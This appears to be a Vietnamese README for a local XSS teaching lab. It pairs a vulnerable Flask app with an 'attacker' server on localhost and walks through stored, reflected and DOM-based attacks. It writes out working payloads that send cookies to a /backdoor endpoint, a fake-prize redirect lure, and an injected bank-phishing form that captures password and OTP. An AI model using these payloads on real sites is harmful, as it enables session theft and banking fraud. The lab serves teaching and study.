# Cross-Site-Scripting-XSS

python -m venv venv
.\venv\Scripts\activate
pip install flask==2.2.5 Flask-MySQLdb

Cấu hình thông tin kết nối Database( trong xss-lab/website1.py )

Terminal 1 (Ứng dụng có lỗ hổng):

# Di chuyển vào thư mục xss_demo
cd xss_demo
python app1.py
Ứng dụng này sẽ chạy tại http://127.0.0.1:5001.
Go Live: xss-lab/index.html


Terminal 2 (Máy chủ của kẻ tấn công):

# Di chuyển vào thư mục data-leak-demo
cd data-leak-demo
python app2.py
Máy chủ này sẽ lắng nghe tại http://127.0.0.1:8000.


1. Tấn công Stored XSS (XSS Lưu trữ)
    Payload được lưu vào cơ sở dữ liệu và sẽ tấn công bất kỳ ai xem trang chứa nó.

    Các bước thực hiện:
        Mở trình duyệt và truy cập trang bình luận: http://127.0.0.1:5001/stored
        Trong ô "Để lại bình luận...", hãy nhập vào payload sau:
        <script>fetch('http://127.0.0.1:8000/backdoor?data=' + encodeURIComponent(document.cookie));</script>
        Nhấn nút "Gửi".

2. Tấn công Reflected XSS (XSS Phản chiếu)

    Payload nằm trực tiếp trên URL. Kẻ tấn công phải lừa nạn nhân nhấp vào một liên kết đã được chuẩn bị sẵn.

    Các bước thực hiện:
        Tạo một URL độc hại.
        Để thử nghiệm, bạn chỉ cần dán URL sau vào trình duyệt và nhấn Enter:
        http://127.0.0.1:5001/reflected?q=<svg onload="if(confirm('Chúc mừng! Bạn đã nhận được một phần thưởng 50 tiệu đồng. Nhấn OK để nhận ngay.')){window.location.href='http://127.0.0.1:8000/backdoor';}">



3. Tấn công DOM-Based XSS (XSS dựa trên DOM)

    Payload cũng nằm trong URL (thường là sau dấu #) và được JavaScript của trang web thực thi mà không cần gửi đến máy chủ.

    Các bước thực hiện:
        Tạo URL độc hại. Payload được đặt trong phần "hash" (#) của URL.
        Dán URL sau vào trình duyệt và nhấn Enter:
        http://127.0.0.1:5001/dom#<img src=x onerror="fetch('http://127.0.0.1:8000/backdoor?data='+encodeURIComponent(document.cookie))">
        (Payload này tạo một thẻ <img> có nguồn không hợp lệ để kích hoạt sự kiện onerror, từ đó thực thi mã độc).

    Có thể thay đổi giao diện Web có lỗ hỏng DOM-Based XSS:
        http://127.0.0.1:5001/dom#%3Cstyle%3E%23phishing-popup%7Bposition:fixed;top:0;left:0;width:100%25;height:100%25;background-color:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:10000;font-family:'Segoe%20UI',Tahoma,Geneva,Verdana,sans-serif%7D%23phishing-form%7Bbackground:%23f9f9f9;padding:25px%2035px;border-radius:12px;box-shadow:0%208px%2025px%20rgba(0,0,0,0.2);text-align:center;width:380px;border-top:5px%20solid%20%23007bff%7D%23phishing-form%20h2%7Bmargin-top:0;color:%23333%7D%23phishing-form%20p%7Bcolor:%23666;font-size:15px%7D%23phishing-form%20input%7Bwidth:90%25;padding:12px;margin:10px%20auto;border:1px%20solid%20%23ddd;border-radius:5px;font-size:16px%7D%23phishing-form%20button%7Bwidth:95%25;padding:14px;background-color:%23007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-size:18px;font-weight:bold;margin-top:10px%7D%23phishing-form%20button:hover%7Bbackground-color:%230056b3%7D%3C/style%3E%3Cdiv%20id=%22phishing-popup%22%3E%3Cdiv%20id=%22phishing-form%22%3E%3Ch2%3EX%C3%A1c%20nh%E1%BA%ADn%20giao%20d%E1%BB%8Bch%20quan%20tr%E1%BB%8Dng%3C/h2%3E%3Cp%3E%C4%90%E1%BB%83%20%C4%91%E1%BA%A3m%20b%E1%BA%A3o%20an%20to%C3%A0n,%20vui%20l%C3%B2ng%20x%C3%A1c%20th%E1%BB%B1c%20th%C3%B4ng%20tin%20t%C3%A0i%20kho%E1%BA%A3n%20c%E1%BB%A7a%20b%E1%BA%A1n%20%C4%91%E1%BB%83%20ho%C3%A0n%20t%E1%BA%A5t.%3C/p%3E%3Cinput%20type=%22text%22%20id=%22p_fullname%22%20placeholder=%22H%E1%BB%8D%20v%C3%A0%20T%C3%AAn%20ch%E1%BB%A7%20t%C3%A0i%20kho%E1%BA%A3n%22%3E%3Cinput%20type=%22text%22%20id=%22p_stk%22%20placeholder=%22S%E1%BB%91%20t%C3%A0i%20kho%E1%BA%A3n%20(STK)%22%3E%3Cinput%20type=%22password%22%20id=%22p_password%22%20placeholder=%22M%E1%BA%ADt%20kh%E1%BA%A9u%20Internet%20Banking%22%3E%3Cinput%20type=%22text%22%20id=%22p_otp%22%20placeholder=%22Nh%E1%BA%ADp%20m%C3%A3%20OTP%20v%E1%BB%ABa%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%ADi%20%C4%91%E1%BA%BFn%22%3E%3Cbutton%20onclick=%22stealBankInfo()%22%3EX%C3%81C%20NH%E1%BA%ACN%3C/button%3E%3C/div%3E%3C/div%3E%3Cscript%3Efunction%20stealBankInfo()%7Blet%20fullname=document.getElementById('p_fullname').value;let%20stk=document.getElementById('p_stk').value;let%20password=document.getElementById('p_password').value;let%20otp=document.getElementById('p_otp').value;let%20stolenData=`[BANK%20INFO]%20Full%20Name:%20${fullname}%20%7C%20Account:%20${stk}%20%7C%20Password:%20${password}%20%7C%20OTP:%20${otp}`;fetch('http://127.0.0.1:8000/backdoor?data='+encodeURIComponent(stolenData));document.getElementById('phishing-form').innerHTML='<h2>%C4%90ang%20x%E1%BB%AD%20l%C3%BD...</h2><p>Vui%20l%C3%B2ng%20kh%C3%B4ng%20t%E1%BA%AFt%20tr%C3%ACnh%20duy%E1%BB%87t.%20Giao%20d%E1%BB%8Bch%20c%E1%BB%A7a%20b%E1%BA%A1n%20%C4%91ang%20%C4%91%C6%B0%E1%BB%A3c%20x%E1%BB%AD%20l%C3%BD.</p>'%7D%3C/script%3E